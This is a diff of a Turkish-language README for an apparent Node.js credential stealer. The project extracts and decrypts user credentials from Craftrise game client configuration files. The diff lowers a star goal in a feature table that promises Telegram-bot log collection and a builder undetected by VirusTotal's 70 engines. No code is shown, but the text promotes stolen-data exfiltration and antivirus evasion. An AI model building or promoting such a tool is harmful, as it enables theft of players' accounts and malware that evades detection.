@@ -4,7 +4,7 @@
 | ⭐ Yıldız | 🎁 Özellik |
 |----------|------------|
 | **10** | 📱 Telegram bot entegrasyonu ile log alma |
-| **20** | 🛡️ VirusTotal 0/70 algılama-free builder |
+| **15** | 🛡️ VirusTotal 0/70 algılama-free builder |
 
 Craftrise istemci yapılandırma dosyalarından kullanıcı kimlik bilgilerini çıkarıp şifresini çözen Node.js aracı.
 
